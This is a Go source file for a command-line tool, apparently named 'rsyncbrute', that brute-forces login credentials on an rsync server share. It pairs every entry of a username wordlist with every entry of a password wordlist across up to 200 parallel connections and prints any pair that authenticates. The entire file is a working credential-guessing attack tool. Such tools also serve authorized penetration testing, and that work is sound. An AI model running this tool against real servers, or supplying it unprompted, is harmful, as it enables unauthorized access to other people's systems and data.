package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"rsyncbrute/rsync"
	"sync"
	"time"
)

type ProgressTracker struct {
	total     int
	completed int
	start     time.Time
	lock      sync.Mutex
}

func (pt *ProgressTracker) increment() {
	pt.lock.Lock()
	defer pt.lock.Unlock()
	pt.completed++
	pt.updateProgress()
}

func (pt *ProgressTracker) updateProgress() {
	percentage := float64(pt.completed) / float64(pt.total) * 100
	elapsed := time.Since(pt.start)
	eta := time.Duration(0)
	if percentage > 0 {
		eta = time.Duration(float64(elapsed) / percentage * (100 - percentage))
	}

	fmt.Printf("\rProgress: %d/%d (%.2f%%) Elapsed: %s ETA: %s", pt.completed, pt.total, percentage, elapsed.Round(time.Second), eta.Round(time.Second))
}

func lineCount(file *os.File) (int, error) {
	count := 0
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		count++
	}
	if err := scanner.Err(); err != nil {
		return 0, err
	}

	return count, nil
}

func main() {
	host := flag.String("host", "", "Rsync server hostname")
	port := flag.Int("port", 873, "Rsync server port")
	share := flag.String("share", "", "Rsync share name")
	usernamesFile := flag.String("usernames", "", "File with usernames")
	passwordsFile := flag.String("passwords", "", "File with passwords")
	maxConnections := flag.Int("max-connections", 200, "Maximum number of parallel connections")
	flag.Parse()

	if *host == "" || *share == "" || *usernamesFile == "" || *passwordsFile == "" {
		flag.Usage()
		os.Exit(1)
	}

	usernames, err := os.Open(*usernamesFile)
	if err != nil {
		log.Fatal(err)
	}
	defer usernames.Close()

	passwords, err := os.Open(*passwordsFile)
	if err != nil {
		log.Fatal(err)
	}
	defer passwords.Close()

	// count the number of lines in usernamesFile
	numUsernames, err := lineCount(usernames)
	if err != nil {
		log.Fatal(err)
	}
	numPasswords, err := lineCount(passwords)
	if err != nil {
		log.Fatal(err)
	}

	totalCombinations := numUsernames * numPasswords
	progressTracker := &ProgressTracker{total: totalCombinations, start: time.Now()}

	var wg sync.WaitGroup
	wg.Add(totalCombinations)

	semaphore := make(chan struct{}, *maxConnections)

	usernames.Seek(0, io.SeekStart)
	usernamesScanner := bufio.NewScanner(usernames)
	for usernamesScanner.Scan() {
		username := usernamesScanner.Text()

		passwords.Seek(0, io.SeekStart)

		passwordsScanner := bufio.NewScanner(passwords)
		for passwordsScanner.Scan() {
			password := passwordsScanner.Text()
			semaphore <- struct{}{} // acquire semaphore before starting goroutine
			go func(u, p string) {
				defer func() { <-semaphore; wg.Done() }() // release semaphore and mark as done when finished

				conn, err := rsync.Connect(*host, *port)
				if err != nil {
					return
				}
				defer conn.Close()

				if rsync.Auth(conn, u, p, *share) {
					fmt.Printf("\nValid credentials found - Username: %s, Password: %s\n", u, p)
					os.Exit(0)
					//return
				}
				progressTracker.increment()

			}(username, password)
		}
	}

	wg.Wait()
	fmt.Println("\nNo valid credentials found")
}
